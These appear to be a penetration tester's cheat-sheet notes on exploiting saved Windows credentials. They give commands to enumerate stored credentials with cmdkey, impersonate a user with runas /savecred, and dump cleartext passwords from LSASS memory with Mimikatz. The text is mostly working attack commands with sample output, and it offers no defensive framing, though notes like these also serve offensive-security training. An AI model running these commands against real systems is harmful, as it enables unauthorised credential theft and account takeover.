- Windows lets users/apps save creds for other systems (RDP, file shares, websites), stored encrypted under the user's profile

## Enumerate saved creds (no tool needed)
```cmd
cmdkey /list

# Example Output
Target: Domain:interactive=SRV01\mcharles  
Type: Domain Password  
User: SRV01\mcharles
```

- `Domain Password` type = we can actually use this to run commands as that user, even without knowing the password:
```cmd
runas /savecred /user:SRV01\mcharles cmd

runas = built-in windows utility
/savecred = Since we know the credential manager stored the user creds, we can run as the user
```
- this works because Windows already has the password stored and encrypted, `runas` just uses it

---
## Decrypt the actual password with Mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```
- this pulls password in cleartext for the saved credential, straight from LSASS memory